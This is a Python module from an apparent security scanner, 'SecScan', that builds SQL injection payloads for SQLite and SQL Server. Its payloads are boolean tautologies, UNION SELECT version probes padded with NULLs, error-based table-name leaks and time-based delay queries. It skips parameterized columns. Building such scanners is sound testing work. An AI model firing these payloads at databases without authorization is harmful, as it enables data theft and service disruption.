# injector.py — SecScan smart injection payload generator

from typing import Optional


class SmartInjector:
    """
    Generates SQL injection payloads appropriate for the target column type,
    DB type, and attack technique.

    Fixes vs original:
    - UNION payloads padded with NULLs to match column count (prevents column mismatch error)
    - SQLite time-based payload implemented via randomblob() heavy computation
    - Time-based option hidden for SQLite in UI (exposed via available_attacks())
    - Safe (parameterized) columns skipped automatically
    - Join columns still skipped
    """

    def __init__(self, parsed_data: dict, column_counts: Optional[dict] = None):
        self.column_types: dict  = parsed_data["column_types"]
        self.joins: list         = parsed_data["joins"]
        self.db_type: str        = parsed_data["db_type"]
        self.safe_columns: dict  = parsed_data.get("safe_columns", {})
        self.vuln_columns: dict  = parsed_data.get("vulnerable_columns", {})
        self.column_counts: dict = column_counts or {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def inject(self, table: str, column: str, attack: str = "boolean") -> Optional[str]:
        """Generate a payload for the given table/column/attack. Returns None if skipped."""
        if self._is_join_column(table, column):
            return None
        if self._is_safe_column(table, column):
            return None   # parameterized — not injectable

        col_type = self.column_types.get(table, {}).get(column, "TEXT")
        return self._generate_payload(table, col_type, attack)

    def is_column_safe(self, table: str, column: str) -> bool:
        return column in self.safe_columns.get(table, set())

    def is_column_vulnerable(self, table: str, column: str) -> bool:
        return column in self.vuln_columns.get(table, set())

    def available_attacks(self) -> list[dict]:
        """Return list of attack types relevant for this DB."""
        attacks = [
            {"value": "boolean", "label": "Boolean-based (OR 1=1)"},
            {"value": "union",   "label": "UNION-based (extract data)"},
            {"value": "error",   "label": "Error-based (force SQL error)"},
        ]
        if self.db_type == "sqlserver":
            attacks.append({"value": "time", "label": "Time-based (WAITFOR DELAY)"})
        else:
            attacks.append({"value": "time", "label": "Time-based (heavy query)"})
        return attacks

    # ------------------------------------------------------------------
    # Payload routing
    # ------------------------------------------------------------------

    def _generate_payload(self, table: str, col_type: str, attack: str) -> Optional[str]:
        col_count = self.column_counts.get(table, 1)

        if self.db_type == "sqlserver":
            return self._sqlserver_payload(col_type, attack, col_count)
        return self._sqlite_payload(col_type, attack, col_count)

    # ------------------------------------------------------------------
    # SQLite payloads
    # ------------------------------------------------------------------

    def _sqlite_payload(self, col_type: str, attack: str, col_count: int) -> Optional[str]:
        is_int = (col_type == "INTEGER")

        if attack == "boolean":
            if is_int:
                return "1 OR 1=1-- "
            return "' OR '1'='1'-- "

        if attack == "union":
            # Pad with NULLs so column count matches the SELECT *
            extra_nulls = ", ".join(["NULL"] * max(col_count - 1, 0))
            if extra_nulls:
                payload_cols = f"sqlite_version(), {extra_nulls}"
            else:
                payload_cols = "sqlite_version()"

            if is_int:
                return f"0 UNION SELECT {payload_cols}-- "
            return f"' UNION SELECT {payload_cols}-- "

        if attack == "error":
            # SQLite: coerce incompatible types to force an error
            if is_int:
                return "1 AND CAST('not-a-number' AS INTEGER)-- "
            return "' AND CAST(1/0 AS TEXT)-- "

        if attack == "time":
            # SQLite has no sleep(); use a heavy randomblob computation
            if is_int:
                return "1 AND (SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3,sqlite_master t4)>0-- "
            return "' AND (SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3,sqlite_master t4)>0-- "

        return None

    # ------------------------------------------------------------------
    # SQL Server payloads
    # ------------------------------------------------------------------

    def _sqlserver_payload(self, col_type: str, attack: str, col_count: int) -> Optional[str]:
        is_int = (col_type == "INTEGER")

        if attack == "boolean":
            if is_int:
                return "1 OR 1=1-- "
            return "' OR '1'='1'-- "

        if attack == "union":
            extra_nulls = ", ".join(["NULL"] * max(col_count - 1, 0))
            if extra_nulls:
                payload_cols = f"@@version, {extra_nulls}"
            else:
                payload_cols = "@@version"

            if is_int:
                return f"0 UNION SELECT {payload_cols}-- "
            return f"' UNION SELECT {payload_cols}-- "

        if attack == "error":
            if is_int:
                return "1 AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))-- "
            return "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))-- "

        if attack == "time":
            if is_int:
                return "1; WAITFOR DELAY '0:0:5'-- "
            return "'; WAITFOR DELAY '0:0:5'-- "

        return None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _is_join_column(self, table: str, column: str) -> bool:
        for l_t, l_c, r_t, r_c in self.joins:
            if (table == l_t and column == l_c) or (table == r_t and column == r_c):
                return True
        return False

    def _is_safe_column(self, table: str, column: str) -> bool:
        return column in self.safe_columns.get(table, set())
